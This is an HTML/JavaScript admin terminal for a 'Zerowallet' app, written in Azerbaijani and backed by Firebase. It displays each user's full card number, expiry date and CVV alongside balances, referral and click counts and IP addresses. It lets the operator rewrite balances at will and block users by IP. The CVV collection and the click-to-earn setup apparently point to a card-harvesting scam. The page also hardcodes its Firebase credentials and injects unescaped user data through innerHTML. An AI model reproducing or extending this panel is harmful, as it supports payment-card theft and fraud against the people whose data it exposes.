<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <title>Zerowallet | Admin Terminal v2.6</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --neon: #00f2ff; --bg: #0a0a0b; --row-bg: #141416; }
        body { background: var(--bg); color: #e0e0e0; font-family: 'Courier New', monospace; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        h1 { color: var(--neon); border-bottom: 2px solid var(--neon); padding-bottom: 10px; text-transform: uppercase; }
        h2 { color: var(--neon); font-size: 1.2rem; margin-top: 40px; }
        .table-wrap { background: var(--row-bg); border-radius: 10px; overflow: hidden; margin-top: 15px; border: 1px solid #222; overflow-x: auto; }
        table { width: 100%; border-collapse: collapse; min-width: 1100px; }
        th { background: #1c1c1f; padding: 15px; text-align: left; color: var(--neon); font-size: 0.75rem; text-transform: uppercase; }
        td { padding: 15px; border-bottom: 1px solid #1c1c1f; font-size: 0.85rem; }
        .btn { padding: 8px 12px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 5px; font-size: 0.7rem; }
        .btn-block { background: #ff3e3e; color: white; }
        .btn-unblock { background: #00ff41; color: black; }
        .btn-vip { background: #f59e0b; color: black; }
        .sys-box { background: #1c1c1f; padding: 20px; border-radius: 10px; border: 1px solid var(--neon); margin-bottom: 20px; }
        .stat-badge { background: #222; padding: 4px 8px; border-radius: 4px; font-size: 0.8rem; color: #fff; border: 1px solid #333; cursor: pointer; }
        .card-info-box { font-size: 0.7rem; color: #94a3b8; background: #000; padding: 5px; border-radius: 4px; border: 1px solid #333; }
    </style>
</head>
<body>

<div class="container">
    <h1><i class="fas fa-terminal"></i> ADMIN SYSTEM v2.6</h1>

    <div class="sys-box">
        <h3 style="margin-top:0; color:var(--neon);"><i class="fas fa-power-off"></i> SİSTEM STATUSU</h3>
        <p id="status-text">Yüklənir...</p>
        <button id="toggle-sys-btn" class="btn" onclick="toggleSystem()" style="padding: 15px 30px; font-size: 1rem;"></button>
    </div>

    <h2><i class="fas fa-users"></i> İSTİFADƏÇİ İDARƏETMƏSİ</h2>
    <div class="table-wrap">
        <table>
            <thead>
                <tr>
                    <th>Username</th>
                    <th>Balans</th>
                    <th>VIP</th>
                    <th>Paket</th>
                    <th>Ref / Klik</th>
                    <th>Kart Məlumatları</th>
                    <th>IP Ünvanı</th>
                    <th>İdarəetmə</th>
                </tr>
            </thead>
            <tbody id="user-body"></tbody>
        </table>
    </div>
</div>

<script>
    const firebaseConfig = {
        apiKey: "AIzaSyCM5WdZNSj9oFipNI-J3csHpOIvK8PjoLU",
        authDomain: "sevgili-testi.firebaseapp.com",
        databaseURL: "https://sevgili-testi-default-rtdb.firebaseio.com",
        projectId: "sevgili-testi",
        storageBucket: "sevgili-testi.firebasestorage.app",
        messagingSenderId: "399260477557",
        appId: "1:399260477557:web:584204a698d7bf145bb03c"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    function toggleSystem() {
        db.ref('settings/system_status').once('value', snap => {
            const next = snap.val() === "active" ? "maintenance" : "active";
            db.ref('settings').update({ system_status: next });
        });
    }

    db.ref('settings/system_status').on('value', snap => {
        const s = snap.val();
        document.getElementById('status-text').innerHTML = `Status: ${s === 'active' ? '<b style="color:#00ff41">ONLINE</b>' : '<b style="color:#ff3e3e">MAINTENANCE</b>'}`;
        document.getElementById('toggle-sys-btn').innerText = s === 'active' ? "SİSTEMİ BAĞLA" : "SİSTEMİ AÇ";
        document.getElementById('toggle-sys-btn').className = s === 'active' ? "btn btn-block" : "btn btn-unblock";
    });

    db.ref('zerowallet_users').on('value', snap => {
        const body = document.getElementById('user-body');
        body.innerHTML = '';
        snap.forEach(child => {
            const u = child.val();
            const uname = child.key;
            
            let cardInfo = "Yoxdur";
            if(u.cardInfo) {
                cardInfo = `<div class="card-info-box">
                    💳 ${u.cardInfo.number}<br>📅 ${u.cardInfo.expiry} | 🔒 ${u.cardInfo.cvv}
                </div>`;
            }

            body.innerHTML += `<tr>
                <td><b>${uname}</b></td>
                <td><span class="stat-badge" onclick="editStat('${uname}', 'balance', ${u.balance || 0})">${(u.balance || 0).toFixed(4)} AZN</span></td>
                <td><button class="btn ${u.isVip ? 'btn-unblock' : 'btn-vip'}" onclick="toggleStatus('${uname}', 'isVip', ${!u.isVip})">${u.isVip ? 'VIP' : 'SADƏ'}</button></td>
                <td><span class="stat-badge" onclick="editStat('${uname}', 'rocket', '${u.rocket || 'default'}')">${u.rocket || 'default'}</span></td>
                <td>
                    <span class="stat-badge" onclick="editStat('${uname}', 'referralCount', ${u.referralCount || 0})">R: ${u.referralCount || 0}</span>
                    <span class="stat-badge" onclick="editStat('${uname}', 'totalClicks', ${u.totalClicks || 0})">K: ${u.totalClicks || 0}</span>
                </td>
                <td>${cardInfo}</td>
                <td><small>${u.ip || '0.0.0.0'}</small></td>
                <td>
                    <button class="btn ${u.isBlocked ? 'btn-unblock' : 'btn-block'}" onclick="handleBlock('${uname}', '${u.ip}', ${!u.isBlocked})">
                        ${u.isBlocked ? 'BLOKU AÇ' : 'BLOKLA'}
                    </button>
                </td>
            </tr>`;
        });
    });

    function editStat(uname, field, current) {
        let val = prompt(`${uname} üçün yeni ${field}:`, current);
        if (val !== null) {
            let updateObj = {};
            updateObj[field] = (field === 'rocket' || field === 'isVip') ? val : parseFloat(val);
            db.ref('zerowallet_users/' + uname).update(updateObj);
        }
    }

    function toggleStatus(uname, field, status) {
        let obj = {}; obj[field] = status;
        db.ref('zerowallet_users/' + uname).update(obj);
    }

    function handleBlock(uname, ip, status) {
        if(!confirm(status ? "İstifadəçi bloklansın?" : "Blok açılsın?")) return;
        
        // 1. İstifadəçini bazada blokla
        db.ref('zerowallet_users/' + uname).update({ isBlocked: status });
        
        // 2. IP-ni blok siyahısına sal/çıxar
        if(ip) {
            const cleanIp = ip.replace(/\./g, '_');
            if(status) db.ref('blocked_ips/' + cleanIp).set({ ip: ip, username: uname, date: Date.now() });
            else db.ref('blocked_ips/' + cleanIp).remove();
        }
        alert("Əməliyyat uğurludur!");
    }
</script>
</body>
</html>
